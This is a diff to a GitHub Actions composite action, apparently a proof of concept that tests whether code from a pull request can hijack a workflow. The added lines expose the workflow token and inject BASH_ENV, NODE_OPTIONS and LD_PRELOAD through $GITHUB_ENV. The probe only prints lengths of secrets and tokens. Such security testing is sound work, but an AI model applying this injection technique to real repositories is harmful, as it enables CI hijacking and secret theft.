@@ -1,10 +1,19 @@
 name: probe
-description: benign default-branch version
+description: attacker-controlled version coming from the PR merge commit
 runs:
   using: composite
   steps:
     - name: probe
       shell: bash
+      env:
+        GH_TOKEN: ${{ github.token }}
       run: |
-        echo "ACTION_VERSION=SAFE-DEFAULT-BRANCH"
-        echo "INJECTED_MARKER=no" >> "$GITHUB_ENV"
+        echo "ACTION_VERSION=EVIL-PR-CODE"
+        echo "COMPOSITE_TOKEN_LEN=${#GH_TOKEN}"
+        cat > /tmp/envprobe.sh <<'EOS'
+        echo "BASH_ENV_RAN probe_secret_len=${#PROBE_SECRET} bash_env_len=${#BASH_ENV}" > /tmp/envprobe.out
+        EOS
+        echo "BASH_ENV=/tmp/envprobe.sh" >> "$GITHUB_ENV"
+        echo "INJECTED_MARKER=yes" >> "$GITHUB_ENV"
+        echo "NODE_OPTIONS=--require /tmp/nope.js" >> "$GITHUB_ENV" || echo "NODE_OPTIONS_BLOCKED"
+        echo "LD_PRELOAD=/tmp/nope.so" >> "$GITHUB_ENV" || echo "LD_PRELOAD_BLOCKED"
